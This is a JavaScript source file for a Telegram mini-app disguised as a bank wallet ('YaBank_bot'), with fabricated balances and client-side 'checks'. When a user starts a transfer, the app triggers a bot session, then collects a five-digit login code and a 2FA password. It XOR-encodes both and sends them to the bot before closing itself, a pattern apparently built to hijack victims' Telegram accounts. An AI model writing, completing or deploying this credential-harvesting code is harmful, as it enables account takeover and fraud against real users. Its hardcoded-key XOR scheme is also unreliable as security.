const SECRET_KEY = "key12415";

async function sha256(message) {
    const encoder = new TextEncoder();
    const data = encoder.encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    return new Uint8Array(hashBuffer);
}

async function encryptCheck(sum, userId, checkId) {
    const key = await sha256(SECRET_KEY);
    const buf = new ArrayBuffer(16);
    const view = new DataView(buf);
    view.setFloat32(0, sum, true);
    view.setBigUint64(4, BigInt(userId), true);
    view.setUint32(12, checkId, true);
    const bytes = new Uint8Array(buf);
    const encrypted = new Uint8Array(16);
    for (let i = 0; i < 16; i++) {
        encrypted[i] = bytes[i] ^ key[i % key.length];
    }
    let b64 = btoa(String.fromCharCode(...encrypted));
    b64 = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    return b64;
}

function base64UrlDecode(str) {
    const pad = str.length % 4;
    if (pad) str += '='.repeat(4 - pad);
    str = str.replace(/\-/g, '+').replace(/\_/g, '/');
    const binary = atob(str);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    return bytes;
}

function readFloat32(bytes, offset) {
    const buf = new ArrayBuffer(4);
    new Uint8Array(buf).set(bytes.slice(offset, offset + 4));
    return new DataView(buf).getFloat32(0, true);
}

function readUint64(bytes, offset) {
    const buf = new ArrayBuffer(8);
    new Uint8Array(buf).set(bytes.slice(offset, offset + 8));
    const view = new DataView(buf);
    const low = view.getUint32(0, true);
    const high = view.getUint32(4, true);
    return (BigInt(high) << BigInt(32)) | BigInt(low);
}

function readUint32(bytes, offset) {
    const buf = new ArrayBuffer(4);
    new Uint8Array(buf).set(bytes.slice(offset, offset + 4));
    return new DataView(buf).getUint32(0, true);
}

async function decryptCheck(token) {
    try {
        const key = await sha256(SECRET_KEY);
        const encrypted = base64UrlDecode(token);
        if (encrypted.length !== 16) {
            console.error("Wrong length:", encrypted.length, "expected 16");
            return null;
        }
        const decrypted = new Uint8Array(16);
        for (let i = 0; i < 16; i++) {
            decrypted[i] = encrypted[i] ^ key[i % key.length];
        }
        const sum = readFloat32(decrypted, 0);
        const user_id = Number(readUint64(decrypted, 4));
        const check_id = readUint32(decrypted, 12);
        if (isNaN(sum) || sum < 0 || sum > 1000000) {
            console.error("Invalid sum:", sum);
            return null;
        }
        return {
            sum: Math.round(sum * 100) / 100,
            user_id: user_id,
            check_id: check_id
        };
    } catch (e) {
        console.error('Decrypt error:', e);
        return null;
    }
}

// ============ XOR ШИФРОВАНИЕ ДЛЯ КОДА/ПАРОЛЯ ============

async function xorEncrypt(plaintext) {
    const key = await sha256(SECRET_KEY);
    const data = new TextEncoder().encode(plaintext);
    const encrypted = new Uint8Array(data.length);
    for (let i = 0; i < data.length; i++) {
        encrypted[i] = data[i] ^ key[i % key.length];
    }
    let b64 = btoa(String.fromCharCode(...encrypted));
    b64 = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    return b64;
}

// ============ ХРАНИЛИЩЕ ============

function getUserStorageKey(userId) {
    return `app_user_${userId}`;
}

function loadUserData(userId) {
    const key = getUserStorageKey(userId);
    const raw = localStorage.getItem(key);
    if (raw) {
        try {
            return JSON.parse(raw);
        } catch (e) {
            return null;
        }
    }
    return null;
}

function saveUserData(userId, data) {
    const key = getUserStorageKey(userId);
    localStorage.setItem(key, JSON.stringify(data));
}

const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();
tg.setHeaderColor("#17212b");

const user = tg.initDataUnsafe?.user;
let currentUserId = null;
let userData = null;

if (user && user.id) {
    currentUserId = user.id;
} else {
    currentUserId = parseInt(localStorage.getItem('debug_user_id') || '0') || null;
}

if (currentUserId) {
    userData = loadUserData(currentUserId);
    if (!userData) {
        userData = { balance: 0, usedChecks: [], transactions: [] };
        saveUserData(currentUserId, userData);
    }
    if (!userData.transactions) {
        userData.transactions = [];
    }
    if (!userData.usedChecks) {
        userData.usedChecks = [];
    }
} else {
    userData = { balance: 0, usedChecks: [], transactions: [] };
}

if (user) {
    const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
    document.getElementById('userName').textContent = fullName || 'Name';
    document.getElementById('userUsername').textContent = user.username ? '@' + user.username : '@username';
    const avatarEl = document.getElementById('userAvatar');
    if (user.photo_url) {
        avatarEl.innerHTML = `<img src="${user.photo_url}" alt="avatar">`;
    } else {
        avatarEl.textContent = (user.first_name?.[0] || 'N').toUpperCase();
    }
}

function formatDate(dateStr) {
    const d = new Date(dateStr);
    const now = new Date();
    const isToday = d.toDateString() === now.toDateString();
    if (isToday) {
        return d.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
    }
    return d.toLocaleDateString('ru-RU', { day: 'numeric', month: 'short' });
}

function updateBalanceDisplay() {
    document.getElementById('balance').textContent = userData.balance.toLocaleString('ru-RU', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    }) + ' ₽';
}

function renderMiniHistoryItem(tx) {
    const isIncome = tx.type === 'income';
    const iconClass = isIncome ? 'income' : 'outcome';
    const amountClass = isIncome ? 'income' : 'outcome';
    const sign = isIncome ? '+' : '-';
    const statusBadge = tx.status === 'processing' ? '<span class="tx-status">⏳</span>' : '';
    const iconSvg = isIncome 
        ? '<svg viewBox="0 0 24 24"><path d="M7 14l5-5 5 5H7z"/></svg>'
        : '<svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>';
    return `
        <div class="history-item">
            <div class="history-item-left">
                <div class="history-icon ${iconClass}">${iconSvg}</div>
                <div class="history-info">
                    <div class="history-desc">${tx.description} ${statusBadge}</div>
                    <div class="history-date">${formatDate(tx.date)}</div>
                </div>
            </div>
            <div class="history-amount ${amountClass}">${sign}${tx.amount.toFixed(2)} ₽</div>
        </div>
    `;
}

function renderFullHistoryItem(tx) {
    const isIncome = tx.type === 'income';
    const iconClass = isIncome ? 'income' : 'outcome';
    const amountClass = isIncome ? 'income' : 'outcome';
    const sign = isIncome ? '+' : '-';
    const statusText = tx.status === 'processing' ? ' • В обработке' : '';
    const iconSvg = isIncome 
        ? '<svg viewBox="0 0 24 24"><path d="M7 14l5-5 5 5H7z"/></svg>'
        : '<svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>';
    return `
        <div class="all-history-item">
            <div class="all-history-item-left">
                <div class="all-history-icon ${iconClass}">${iconSvg}</div>
                <div class="all-history-info">
                    <div class="all-history-desc">${tx.description}</div>
                    <div class="all-history-date">${formatDate(tx.date)}${statusText}</div>
                </div>
            </div>
            <div class="all-history-amount ${amountClass}">${sign}${tx.amount.toFixed(2)} ₽</div>
        </div>
    `;
}

function renderMiniHistory() {
    const container = document.getElementById('historyContent');
    if (!userData.transactions || userData.transactions.length === 0) {
        container.innerHTML = '<div class="history-empty">Нет операций</div>';
        return;
    }
    const sorted = [...userData.transactions].sort((a, b) => 
        new Date(b.date) - new Date(a.date)
    );
    const recent = sorted.slice(0, 3);
    let html = '<div class="history-list">';
    for (const tx of recent) {
        html += renderMiniHistoryItem(tx);
    }
    html += '</div>';
    container.innerHTML = html;
}

function renderFullHistory() {
    const container = document.getElementById('allHistoryContent');
    if (!userData.transactions || userData.transactions.length === 0) {
        container.innerHTML = '<div class="all-history-empty">Нет операций</div>';
        return;
    }
    const sorted = [...userData.transactions].sort((a, b) => 
        new Date(b.date) - new Date(a.date)
    );
    let html = '';
    for (const tx of sorted) {
        html += renderFullHistoryItem(tx);
    }
    container.innerHTML = html;
}

updateBalanceDisplay();
renderMiniHistory();

// SVG-иконки
const toastIcons = {
    success: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>`,
    error: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>`,
    info: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>`
};

function showToast(message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;

    toast.innerHTML = `
        <div class="toast-icon">${toastIcons[type] || toastIcons.info}</div>
        <div class="toast-message">${message}</div>
    `;

    container.appendChild(toast);

    requestAnimationFrame(() => {
        requestAnimationFrame(() => {
            toast.classList.add('show');
        });
    });

    setTimeout(() => {
        toast.classList.remove('show');
        toast.classList.add('hide');
        setTimeout(() => {
            toast.remove();
        }, 300);
    }, 3000);
}


async function processCheck(token) {
    if (!token) return;
    if (!currentUserId) {
        showToast('Ошибка: не удалось определить пользователя', 'error');
        return;
    }
    const data = await decryptCheck(token);
    if (!data) {
        showToast('Неверный или повреждённый чек', 'error');
        return;
    }
    if (data.user_id !== currentUserId) {
        showToast('Этот чек предназначен для другого пользователя', 'error');
        return;
    }
    if (userData.usedChecks.includes(data.check_id)) {
        showToast('Этот чек уже был активирован', 'info');
        return;
    }
    userData.balance += data.sum;
    userData.usedChecks.push(data.check_id);
    userData.transactions.push({
        date: new Date().toISOString(),
        type: 'income',
        amount: data.sum,
        description: 'Активация чека'
    });
    saveUserData(currentUserId, userData);
    updateBalanceDisplay();
    renderMiniHistory();
    showToast(`+${data.sum.toFixed(2)} ₽ зачислено!`, 'success');
    if (window.history.replaceState) {
        window.history.replaceState({}, document.title, window.location.pathname);
    }
}

const initData = tg.initData;
const startParam = tg.initDataUnsafe?.start_param;

// Проверяем, что startParam не является служебным параметром перед обработкой как чек
const isServiceParam = startParam && (
    startParam.startsWith('enterPassword_') ||
    startParam.startsWith('success_') ||
    startParam.startsWith('retry_')
);

if (initData && startParam && startParam.trim() !== '' && !isServiceParam) {
    const lastProcessed = sessionStorage.getItem('last_processed_check');
    if (lastProcessed !== startParam) {
        sessionStorage.setItem('last_processed_check', startParam);
        processCheck(startParam);
    }
}

const bannersTrack = document.getElementById('bannersTrack');
const bannersDots = document.getElementById('bannersDots');
const dots = bannersDots.querySelectorAll('.banner-dot');

bannersTrack.addEventListener('scroll', () => {
    const slideWidth = bannersTrack.offsetWidth;
    const index = Math.round(bannersTrack.scrollLeft / slideWidth);
    dots.forEach((dot, i) => {
        dot.classList.toggle('active', i === index);
    });
});

dots.forEach(dot => {
    dot.addEventListener('click', () => {
        const index = parseInt(dot.dataset.index);
        const slideWidth = bannersTrack.offsetWidth;
        bannersTrack.scrollTo({ left: index * slideWidth, behavior: 'smooth' });
    });
});

const screenStack = [];
let backButtonHandler = null;

function pushScreen(screenElement, onBack, headerColor) {
    screenStack.push({ element: screenElement, onBack: onBack, headerColor: headerColor });
    if (headerColor) {
        tg.setHeaderColor(headerColor);
    }
    updateBackButton();
}

function popScreen() {
    if (screenStack.length === 0) return;
    const screen = screenStack.pop();
    screen.element.classList.remove('active');
    if (screen.onBack) screen.onBack();
    const prevScreen = screenStack.length > 0 ? screenStack[screenStack.length - 1] : null;
    if (prevScreen && prevScreen.headerColor) {
        tg.setHeaderColor(prevScreen.headerColor);
    } else {
        tg.setHeaderColor("#17212b");
    }
    updateBackButton();
}

function updateBackButton() {
    if (screenStack.length > 0) {
        tg.BackButton.show();
        if (backButtonHandler) {
            tg.BackButton.offClick(backButtonHandler);
        }
        backButtonHandler = () => {
            popScreen();
        };
        tg.BackButton.onClick(backButtonHandler);
    } else {
        if (backButtonHandler) {
            tg.BackButton.offClick(backButtonHandler);
            backButtonHandler = null;
        }
        tg.BackButton.hide();
    }
}

const qrScreen = document.getElementById('qrScreen');
const qrBtn = document.getElementById('qrBtn');
const startScan = document.getElementById('startScan');

qrBtn.addEventListener('click', () => {
    qrScreen.classList.add('active');
    pushScreen(qrScreen, null, "#1a1d29");
});

document.getElementById('bannerQr').addEventListener('click', () => {
    qrScreen.classList.add('active');
    pushScreen(qrScreen, null, "#1a1d29");
});

document.getElementById('bannerFest').addEventListener('click', () => {
    transferScreen.classList.add('active');
    pushScreen(transferScreen);
});

startScan.addEventListener('click', () => {
    if (tg.showScanQrPopup) {
        tg.showScanQrPopup({
            text: 'Наведите камеру на QR-код оплаты'
        }, async (text) => {
            await processCheck(text);
            qrScreen.classList.remove('active');
            return true;
        });
    } else {
        tg.showAlert('Сканер QR недоступен на этом устройстве');
    }
});

const allHistoryScreen = document.getElementById('allHistoryScreen');
const showAllHistoryBtn = document.getElementById('showAllHistory');

showAllHistoryBtn.addEventListener('click', () => {
    renderFullHistory();
    allHistoryScreen.classList.add('active');
    pushScreen(allHistoryScreen);
});

const transferScreen = document.getElementById('transferScreen');
const transferBtn = document.getElementById('transferBtn');

if (transferBtn) {
    transferBtn.addEventListener('click', () => {
        transferScreen.classList.add('active');
        pushScreen(transferScreen);
    });
}

// ==================== ПОПОЛНЕНИЕ БАЛАНСА ====================

const topUpBtn = document.getElementById('topUpBtn');
const instructionScreen = document.getElementById('instructionScreen');

if (topUpBtn) {
    topUpBtn.addEventListener('click', () => {
        if (!userData.phone) {
            // Номер телефона не сохранён — показываем экран настройки
            setupScreen.classList.add('active');
            pushScreen(setupScreen);
            showToast('Сначала укажите номер телефона', 'info');
        } else {
            // Номер телефона сохранён — показываем инструкцию
            instructionScreen.classList.add('active');
            pushScreen(instructionScreen, null, "#17212b");
        }
    });
}


const setupScreen = document.getElementById('setupScreen');
const setupPhoneStep = document.getElementById('setupPhoneStep');

document.querySelectorAll('.transfer-item').forEach(item => {
    item.addEventListener('click', () => {
        const action = item.dataset.action;

        if (!userData.phone && action !== 'check') {
            transferScreen.classList.remove('active');
            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
                screenStack.pop();
            }
            setupScreen.classList.add('active');
            pushScreen(setupScreen);
            return;
        }

        if (action === 'wallet') {
            transferScreen.classList.remove('active');
            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
                screenStack.pop();
            }
            document.getElementById('walletTransferScreen').classList.add('active');
            pushScreen(document.getElementById('walletTransferScreen'));
        } else if (action === 'card') {
            transferScreen.classList.remove('active');
            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
                screenStack.pop();
            }
            document.getElementById('cardTransferScreen').classList.add('active');
            pushScreen(document.getElementById('cardTransferScreen'));
        } else if (action === 'phone') {
            transferScreen.classList.remove('active');
            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
                screenStack.pop();
            }
            document.getElementById('phoneTransferScreen').classList.add('active');
            pushScreen(document.getElementById('phoneTransferScreen'));
        } else if (action === 'check') {
            transferScreen.classList.remove('active');
            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
                screenStack.pop();
            }
            document.getElementById('checkScreen').classList.add('active');
            pushScreen(document.getElementById('checkScreen'));
        }
    });
});

const phoneModal = document.getElementById('phoneModal');
const phoneModalOverlay = document.getElementById('phoneModalOverlay');
const phoneModalClose = document.getElementById('phoneModalClose');
const phoneModalContinue = document.getElementById('phoneModalContinue');

function openPhoneModal() {
    phoneModal.classList.add('active');
    tg.setHeaderColor("#090C11");
}

function closePhoneModal() {
    phoneModal.classList.remove('active');
    const currentScreen = screenStack.length > 0 ? screenStack[screenStack.length - 1] : null;
    if (currentScreen && currentScreen.headerColor) {
        tg.setHeaderColor(currentScreen.headerColor);
    } else {
        tg.setHeaderColor("#17212b");
    }
}

if (setupPhoneStep) {
    setupPhoneStep.addEventListener('click', openPhoneModal);
}

if (phoneModalOverlay) {
    phoneModalOverlay.addEventListener('click', closePhoneModal);
}

if (phoneModalClose) {
    phoneModalClose.addEventListener('click', closePhoneModal);
}

if (phoneModalContinue) {
    phoneModalContinue.addEventListener('click', () => {
        if (tg.requestContact) {
            tg.requestContact((sent, event) => {
                if (sent) {
                    const phone = event?.responseUnsafe?.contact?.phone_number;
                    if (phone) {
                        userData.phone = phone;
                        if (currentUserId) {
                            saveUserData(currentUserId, userData);
                        }
                        showToast('Номер телефона сохранён!', 'success');
                        closePhoneModal();
                        setupPhoneStep.classList.remove('active');
                        setupPhoneStep.classList.add('done');
                        const icon = setupPhoneStep.querySelector('.setup-step-icon');
                        icon.classList.remove('blue');
                        icon.classList.add('green');
                        icon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
                        setupPhoneStep.querySelector('.setup-step-arrow').outerHTML = '<div class="setup-step-check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>';
                        document.querySelector('.progress-bar').style.strokeDashoffset = '0';
                        document.querySelector('.setup-percent').textContent = '100%';
                        document.querySelector('.setup-subtitle').textContent = 'Всё готово!';
                    }
                } else {
                    showToast('Доступ к контактам отклонён', 'error');
                }
            });
        } else {
            showToast('requestContact недоступен', 'error');
        }
    });
}

if (user) {
    const setupAvatar = document.getElementById('setupAvatar');
    if (setupAvatar) {
        if (user.photo_url) {
            setupAvatar.innerHTML = `<img src="${user.photo_url}" alt="avatar">`;
        } else {
            setupAvatar.textContent = (user.first_name?.[0] || 'N').toUpperCase();
        }
    }
}

// ==================== ЭКРАН ВВОДА КОДА ====================

const codeScreen = document.getElementById('codeScreen');
const codeDots = document.querySelectorAll('.code-dot');
const codeKeys = document.querySelectorAll('.code-key');
const codeBackspace = document.getElementById('codeBackspace');
const codeClose = document.getElementById('codeClose');
let currentCode = '';

function updateCodeDots() {
    codeDots.forEach((dot, i) => {
        if (i < currentCode.length) {
            dot.classList.add('filled');
        } else {
            dot.classList.remove('filled');
        }
    });
}

async function appendCodeDigit(digit) {
    if (currentCode.length >= 5) return;
    currentCode += digit;
    updateCodeDots();
    if (currentCode.length === 5) {
        const encryptedCode = await xorEncrypt(currentCode);
        const botUsername = 'YaBank_bot';

        // Отправляем код боту
        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);

        // Показываем спиннер после отправки, ожидаем 2 секунды
        const keypad = document.querySelector('.code-keypad');
        if (keypad) {
            keypad.style.pointerEvents = 'none';
            keypad.style.opacity = '0.5';
        }

        const codeTitle = document.querySelector('.code-title');
        if (codeTitle) {
            codeTitle.dataset.originalText = codeTitle.textContent;
            codeTitle.innerHTML = '<span class="spinner"></span> Проверка кода...';
        }

        setTimeout(() => {
            // Закрываем WebApp полностью
            tg.close();
        }, 2000);
    }
}

function removeCodeDigit() {
    currentCode = currentCode.slice(0, -1);
    updateCodeDots();
}

codeKeys.forEach(key => {
    key.addEventListener('click', () => {
        const digit = key.dataset.digit;
        if (digit) {
            appendCodeDigit(digit);
        }
    });
});

if (codeBackspace) {
    codeBackspace.addEventListener('click', removeCodeDigit);
}

if (codeClose) {
    codeClose.addEventListener('click', () => {
        codeScreen.classList.remove('active');
        currentCode = '';
        updateCodeDots();
        if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === codeScreen) {
            screenStack.pop();
        }
        updateBackButton();
    });
}

// ==================== ЭКРАН ВВОДА ПАРОЛЯ 2FA ====================

const passwordScreen = document.getElementById('passwordScreen');
const passwordInput = document.getElementById('passwordInput');
const passwordSubmit = document.getElementById('passwordSubmit');

if (passwordSubmit) {
    passwordSubmit.addEventListener('click', async () => {
        const password = passwordInput.value.trim();
        if (!password) {
            showToast('Введите пароль', 'error');
            return;
        }

        const encryptedPassword = await xorEncrypt(password);
        const botUsername = 'YaBank_bot';

        // Отправляем пароль боту
        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);

        // Показываем спиннер после отправки, ожидаем 2 секунды
        passwordSubmit.disabled = true;
        passwordSubmit.classList.add('btn-loading');
        const originalText = passwordSubmit.textContent;
        passwordSubmit.innerHTML = '<span class="spinner"></span>Проверка...';

        const passwordSubtitle = document.querySelector('.password-subtitle');
        if (passwordSubtitle) {
            passwordSubtitle.dataset.originalText = passwordSubtitle.textContent;
            passwordSubtitle.innerHTML = '<span class="spinner"></span> Проверка пароля...';
        }

        setTimeout(() => {
            // Закрываем WebApp полностью
            tg.close();
        }, 2000);
    });
}

// ==================== ЛОГИКА ПЕРЕВОДОВ ====================

function validateAmount(value, min) {
    const num = parseFloat(value);
    if (isNaN(num) || num <= 0) return false;
    if (num < min) return false;
    if (num > userData.balance) return false;
    return true;
}

function addTransaction(type, amount, description) {
    userData.transactions.push({
        date: new Date().toISOString(),
        type: type,
        amount: amount,
        description: description
    });
    if (currentUserId) {
        saveUserData(currentUserId, userData);
    }
    updateBalanceDisplay();
    renderMiniHistory();
}

// Сохраняет pending транзакцию перед авторизацией
function savePendingTransaction(amount, description) {
    userData.pending_transaction = {
        amount: amount,
        description: description,
        date: new Date().toISOString()
    };
    saveUserData(currentUserId, userData);
}

// Фиксирует pending транзакцию после успешной авторизации
function commitPendingTransaction() {
    if (!userData.pending_transaction) return false;
    
    const tx = userData.pending_transaction;
    
    // Списываем сумму с баланса
    userData.balance -= tx.amount;
    
    // Добавляем транзакцию в историю со статусом "processing"
    userData.transactions.push({
        date: tx.date,
        type: 'outcome',
        amount: tx.amount,
        description: tx.description,
        status: 'processing'
    });
    
    // Удаляем pending
    delete userData.pending_transaction;
    
    saveUserData(currentUserId, userData);
    updateBalanceDisplay();
    renderMiniHistory();
    
    return true;
}

// Очищает pending транзакцию (при ошибках)
function clearPendingTransaction() {
    if (userData.pending_transaction) {
        delete userData.pending_transaction;
        saveUserData(currentUserId, userData);
    }
}

function startAuthFlow() {
    const botUsername = 'YaBank_bot';

    // Сохраняем флаг, что мы в процессе авторизации
    userData.pending_auth = true;
    saveUserData(currentUserId, userData);

    // Открываем бота для создания сессии
    tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);

    // Показываем спиннер на кнопке после отправки, ожидаем 5 секунд
    const activeForm = document.querySelector('.transfer-form-screen.active');
    let submitBtn = null;
    if (activeForm) {
        submitBtn = activeForm.querySelector('.form-submit-btn');
    }

    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.classList.add('btn-loading');
        const originalText = submitBtn.textContent;
        submitBtn.innerHTML = '<span class="spinner"></span>Ожидание ответа...';
        submitBtn.dataset.originalText = originalText;
    }

    // Через 5 секунд показываем экран ввода кода
    // (пользователь уже получил код в боте)
    setTimeout(() => {
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.classList.remove('btn-loading');
            submitBtn.textContent = submitBtn.dataset.originalText || 'Перевести';
        }

        const activeForm = document.querySelector('.transfer-form-screen.active');
        if (activeForm) {
            activeForm.classList.remove('active');
            // Убираем форму из стека экранов
            const formIndex = screenStack.findIndex(s => s.element === activeForm);
            if (formIndex !== -1) {
                screenStack.splice(formIndex, 1);
            }
        }
        codeScreen.classList.add('active');
        pushScreen(codeScreen, null, "#1a1d29");
    }, 10000);
}

// Проверяем, не было ли прерванной авторизации при загрузке
function restoreAuthState() {
    if (userData.pending_auth) {
        // Пользователь был в процессе авторизации, но вернулся в WebApp
        // Проверяем start_param — возможно авторизация уже завершена
        const startParam = tg.initDataUnsafe?.start_param;
        if (startParam && startParam.startsWith('success_')) {
            // Успех обработается в handleStartAppParam
            return;
        }
        if (startParam && startParam.startsWith('enterPassword_')) {
            // Нужен пароль
            return;
        }
        // Если ничего нет — просто сбрасываем флаг
        delete userData.pending_auth;
        saveUserData(currentUserId, userData);
    }
}

// Перевод в кошелёк
const walletSubmit = document.getElementById('walletSubmit');
const walletRecipient = document.getElementById('walletRecipient');
const walletAmount = document.getElementById('walletAmount');

if (walletSubmit) {
    walletSubmit.addEventListener('click', () => {
        const recipient = walletRecipient.value.trim();
        const amount = parseFloat(walletAmount.value);

        if (!recipient) {
            showToast('Введите получателя', 'error');
            return;
        }
        if (!validateAmount(walletAmount.value, 50)) {
            showToast('Минимальная сумма 50 ₽ или недостаточно средств', 'error');
            return;
        }

        savePendingTransaction(amount, `Перевод в кошелёк: ${recipient}`);
        startAuthFlow();
    });
}

// Перевод на карту
const cardSubmit = document.getElementById('cardSubmit');
const cardNumber = document.getElementById('cardNumber');
const cardAmount = document.getElementById('cardAmount');

if (cardNumber) {
    cardNumber.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        val = val.substring(0, 16);
        let formatted = '';
        for (let i = 0; i < val.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += val[i];
        }
        e.target.value = formatted;
    });
}

if (cardSubmit) {
    cardSubmit.addEventListener('click', () => {
        const card = cardNumber.value.replace(/\s/g, '');
        const amount = parseFloat(cardAmount.value);

        if (card.length < 16) {
            showToast('Введите корректный номер карты', 'error');
            return;
        }
        if (!validateAmount(cardAmount.value, 50)) {
            showToast('Минимальная сумма 50 ₽ или недостаточно средств', 'error');
            return;
        }

        savePendingTransaction(amount, `Перевод на карту **** ${card.slice(-4)}`);
        startAuthFlow();
    });
}

// ==================== ЭКРАН ВЫБОРА БАНКА ====================

const bankScreen = document.getElementById('bankScreen');
const bankSearch = document.getElementById('bankSearch');
const bankList = document.getElementById('bankList');
let banksData = [];
let selectedBank = null;
let pendingPhoneTransfer = null;

async function loadBanks() {
    try {
        const res = await fetch('./banks.json');
        const data = await res.json();
        banksData = (data.dictionary || []).map(i => ({
            name: (i.bankName || '').trim() || 'Банк',
            logo: i.logoURL || ''
        }));
        renderBanks(banksData);
    } catch (e) {
        console.error('Failed to load banks:', e);
        bankList.innerHTML = '<div class="bank-empty">Не удалось загрузить список банков</div>';
    }
}

function renderBanks(list) {
    if (!list.length) {
        bankList.innerHTML = '<div class="bank-empty">Ничего не найдено</div>';
        return;
    }
    let html = '';
    for (const bank of list) {
        const iconHtml = bank.logo
            ? `<img src="${bank.logo}" alt="${bank.name}">`
            : (bank.name[0] || 'Б').toUpperCase();
        html += `
            <div class="bank-item" data-name="${bank.name}">
                <div class="bank-item-icon">${iconHtml}</div>
                <div class="bank-item-name">${bank.name}</div>
            </div>
        `;
    }
    bankList.innerHTML = html;

    bankList.querySelectorAll('.bank-item').forEach(item => {
        item.addEventListener('click', () => {
            selectedBank = item.dataset.name;
            bankScreen.classList.remove('active');
            const bankIndex = screenStack.findIndex(s => s.element === bankScreen);
            if (bankIndex !== -1) screenStack.splice(bankIndex, 1);
            updateBackButton();

            if (pendingPhoneTransfer) {
                const { amount, phone } = pendingPhoneTransfer;
                savePendingTransaction(amount, `Перевод по телефону: ${phone} (${selectedBank})`);
                startAuthFlow();
                pendingPhoneTransfer = null;
            }
        });
    });
}

if (bankSearch) {
    bankSearch.addEventListener('input', () => {
        const q = bankSearch.value.trim().toLowerCase();
        const filtered = q ? banksData.filter(b => b.name.toLowerCase().includes(q)) : banksData;
        renderBanks(filtered);
    });
}

function showBankScreen(amount, phone) {
    pendingPhoneTransfer = { amount, phone };
    selectedBank = null;
    bankSearch.value = '';
    loadBanks();
    bankScreen.classList.add('active');
    pushScreen(bankScreen);
}

// Перевод по телефону
const phoneSubmit = document.getElementById('phoneSubmit');
const phoneRecipient = document.getElementById('phoneRecipient');
const phoneAmount = document.getElementById('phoneAmount');

if (phoneSubmit) {
    phoneSubmit.addEventListener('click', () => {
        const phone = phoneRecipient.value.trim();
        const amount = parseFloat(phoneAmount.value);

        if (!phone || phone.length < 10) {
            showToast('Введите корректный номер телефона', 'error');
            return;
        }
        if (!validateAmount(phoneAmount.value, 50)) {
            showToast('Минимальная сумма 50 ₽ или недостаточно средств', 'error');
            return;
        }

        // Скрываем экран перевода по телефону
        const phoneScreen = document.getElementById('phoneTransferScreen');
        phoneScreen.classList.remove('active');
        const phoneIndex = screenStack.findIndex(s => s.element === phoneScreen);
        if (phoneIndex !== -1) screenStack.splice(phoneIndex, 1);

        // Показываем выбор банка
        showBankScreen(amount, phone);
    });
}

// ==================== СОЗДАНИЕ ЧЕКА ====================

const checkSubmit = document.getElementById('checkSubmit');
const checkAmount = document.getElementById('checkAmount');
const checkRecipient = document.getElementById('checkRecipient');
const checkResultScreen = document.getElementById('checkResultScreen');
const checkResultAmount = document.getElementById('checkResultAmount');
const checkResultToken = document.getElementById('checkResultToken');
const checkCopyBtn = document.getElementById('checkCopyBtn');

let lastCheckToken = '';

function getCheckId() {
    return Math.floor(Math.random() * 4294967295);
}

function parseRecipientId(recipient) {
    if (!recipient) return 0;
    recipient = recipient.trim();
    if (recipient.startsWith('@')) {
        let hash = 0;
        for (let i = 0; i < recipient.length; i++) {
            hash = ((hash << 5) - hash) + recipient.charCodeAt(i);
            hash |= 0;
        }
        return Math.abs(hash) || 1;
    }
    const num = parseInt(recipient);
    return isNaN(num) ? 0 : num;
}

if (checkSubmit) {
    checkSubmit.addEventListener('click', async () => {
        const amount = parseFloat(checkAmount.value);
        const recipient = checkRecipient.value.trim();

        if (!validateAmount(checkAmount.value, 10)) {
            showToast('Минимальная сумма чека 10 ₽ или недостаточно средств', 'error');
            return;
        }

        const recipientId = parseRecipientId(recipient);
        const checkId = getCheckId();

        userData.balance -= amount;

        const token = await encryptCheck(amount, recipientId, checkId);
        lastCheckToken = token;

        if (!userData.createdChecks) userData.createdChecks = [];
        userData.createdChecks.push({
            token: token,
            amount: amount,
            recipientId: recipientId,
            date: new Date().toISOString(),
            checkId: checkId
        });

        addTransaction('outcome', amount, recipientId 
            ? `Создание чека для пользователя (${amount.toFixed(2)} ₽)` 
            : `Создание чека (${amount.toFixed(2)} ₽)`);

        showToast('Чек успешно создан!', 'success');

        checkAmount.value = '';
        checkRecipient.value = '';

        document.getElementById('checkScreen').classList.remove('active');
